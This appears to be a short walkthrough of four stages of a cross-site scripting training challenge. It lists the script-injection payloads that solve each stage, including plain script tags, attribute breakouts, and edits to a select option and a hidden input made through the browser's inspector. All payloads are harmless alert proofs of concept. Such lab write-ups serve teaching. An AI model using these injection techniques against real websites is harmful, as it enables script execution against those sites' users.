## Stage #1
**Payload:** `<script>alert(document.domain)</script>`


## Stage #2
**Payload:** `"><script>alert(document.domain)</script>//`


## Stage #3
Go to inspect and change a option (e.g. USA) to `<script>alert(document.domain)</script>`
Then choose this and click search


## Stage #4
Go to inspect. You'll see a hidden input field after the select tag. Make it visible by removing `type`.
Then use this payload in that input field:
```
"><script>alert(document.domain)</script>//
```

